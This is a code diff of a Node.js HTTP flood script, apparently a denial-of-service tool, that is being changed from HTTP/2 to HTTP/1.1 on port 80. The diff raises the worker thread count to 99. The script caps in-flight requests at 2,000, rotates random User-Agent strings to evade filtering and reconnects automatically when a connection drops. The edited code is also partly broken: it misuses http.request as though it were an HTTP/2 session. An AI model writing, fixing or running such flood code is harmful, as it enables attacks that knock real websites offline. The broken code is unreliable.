@@ -1,10 +1,10 @@
-const http2 = require('http2');
+const http = require('http'); // Use the http module for HTTP/1.1
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const readline = require('readline');
 const net = require('net');
 
-const THREADS = 22;
-const POWER_MULTIPLIER = 4;
+const THREADS = 99;
+const POWER_MULTIPLIER = 1;
 const MAX_INFLIGHT = 2000;
 const LIVE_REFRESH_RATE = 100;
 
@@ -121,11 +121,16 @@ if (isMainThread) {
         if (inflight.count < MAX_INFLIGHT) {
             try {
                 inflight.count++;
-                const req = client.request({
-                    ':method': 'GET',
-                    ':path': '/',
-                    'user-agent': getRandomUserAgent(),  // Use the random User-Agent
-                    'accept-language': 'en-US,en;q=0.9',
+                const req = http.request({
+                    hostname: target,
+                    port: 80,  // Ensure you're using HTTP/1.1 and port 80
+                    path: '/',
+                    method: 'GET',
+                    headers: {
+                        'User-Agent': getRandomUserAgent(),  // Use the random User-Agent
+                        'Accept-Language': 'en-US,en;q=0.9',
+                        'Connection': 'keep-alive',
+                    }
                 });
 
                 req.on('response', () => {
@@ -155,7 +160,15 @@ if (isMainThread) {
 
         let client;
         try {
-            client = http2.connect(target);
+            client = http.request(target, {
+                hostname: target,
+                port: 80,  // Make sure we're using HTTP/1.1
+                method: 'GET',
+                headers: {
+                    'User-Agent': getRandomUserAgent(),  // Random User-Agent
+                    'Connection': 'keep-alive'
+                }
+            });
 
             const inflight = { count: 0 };
 
@@ -164,7 +177,6 @@ if (isMainThread) {
                 setTimeout(createConnection, 5000); // auto-recover fast
             });
 
-            client.on('goaway', () => client.close());
             client.on('close', () => setTimeout(createConnection, 5000));
 
             client.on('connect', () => {
@@ -178,4 +190,4 @@ if (isMainThread) {
     for (let i = 0; i < connections; i++) {
         createConnection();
     }
-}
+                }
